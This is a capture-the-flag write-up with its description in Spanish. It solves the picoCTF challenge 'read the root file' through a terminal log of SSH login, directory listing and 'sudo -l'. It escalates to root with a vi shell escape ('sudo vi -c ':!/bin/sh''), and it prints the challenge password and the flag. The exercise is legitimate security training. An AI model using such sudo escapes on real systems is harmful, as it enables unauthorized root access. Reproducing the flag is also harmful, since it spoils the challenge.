## Descripción 

Can you read files in the root file?The system admin has provisioned an account for you on the main server:`ssh -p 58874 picoplayer@saturn.picoctf.net`Password: `j4ks-9nxB-`Can you login and read the root file?:q!
:q!
vb m\vb n

## Solucion 
```
Jose323-picoctf@webshell:~$ ssh -p 50748 picoplayer@saturn.picoctf.net
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.8.0-1044-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

picoplayer@challenge:~$ ls
picoplayer@challenge:~$ ls -la
total 12
drwxr-xr-x 1 picoplayer picoplayer   20 Feb 17 04:08 .
drwxr-xr-x 1 root       root         24 Aug  4  2023 ..
-rw-r--r-- 1 picoplayer picoplayer  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 picoplayer picoplayer 3771 Feb 25  2020 .bashrc
drwx------ 2 picoplayer picoplayer   34 Feb 17 04:08 .cache
-rw-r--r-- 1 picoplayer picoplayer  807 Feb 25  2020 .profile
picoplayer@challenge:~$ cd ..
picoplayer@challenge:/home$ ls
picoplayer
picoplayer@challenge:/home$ ls -la
total 0
drwxr-xr-x 1 root       root       24 Aug  4  2023 .
drwxr-xr-x 1 root       root       51 Feb 17 04:03 ..
drwxr-xr-x 1 picoplayer picoplayer 20 Feb 17 04:08 picoplayer
picoplayer@challenge:/home$ cd ..
picoplayer@challenge:/$ ls -la
total 0
drwxr-xr-x   1 root   root     51 Feb 17 04:03 .
drwxr-xr-x   1 root   root     51 Feb 17 04:03 ..
-rwxr-xr-x   1 root   root      0 Feb 17 04:03 .dockerenv
lrwxrwxrwx   1 root   root      7 Mar  8  2023 bin -> usr/bin
drwxr-xr-x   2 root   root      6 Apr 15  2020 boot
d---------   1 root   root     27 Aug  4  2023 challenge
drwxr-xr-x   5 root   root    340 Feb 17 04:03 dev
drwxr-xr-x   1 root   root     66 Feb 17 04:03 etc
drwxr-xr-x   1 root   root     24 Aug  4  2023 home
lrwxrwxrwx   1 root   root      7 Mar  8  2023 lib -> usr/lib
lrwxrwxrwx   1 root   root      9 Mar  8  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root   root      9 Mar  8  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root   root     10 Mar  8  2023 libx32 -> usr/libx32
drwxr-xr-x   2 root   root      6 Mar  8  2023 media
drwxr-xr-x   2 root   root      6 Mar  8  2023 mnt
drwxr-xr-x   2 root   root      6 Mar  8  2023 opt
dr-xr-xr-x 212 nobody nogroup   0 Feb 17 04:03 proc
drwx------   1 root   root     23 Aug  4  2023 root
drwxr-xr-x   1 root   root     54 Feb 17 04:08 run
lrwxrwxrwx   1 root   root      8 Mar  8  2023 sbin -> usr/sbin
drwxr-xr-x   2 root   root      6 Mar  8  2023 srv
dr-xr-xr-x  13 nobody nogroup   0 Feb 17 04:03 sys
drwxrwxrwt   1 root   root      6 Aug  4  2023 tmp
drwxr-xr-x   1 root   root     18 Mar  8  2023 usr
drwxr-xr-x   1 root   root     17 Mar  8  2023 var
picoplayer@challenge:/$ cd root
-bash: cd: root: Permission denied
picoplayer@challenge:/$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:/$ sudo vi -c ':!/bin/sh' /dev/null

# ls
bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var
# cd root
# ls
# ls -la
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Feb 17 04:03 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
# cat .flag.text
cat: .flag.text: No such file or directory
# cat .flag.txt 
picoCTF{uS1ng_v1m_3dit0r_021d10ab}
# Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.
```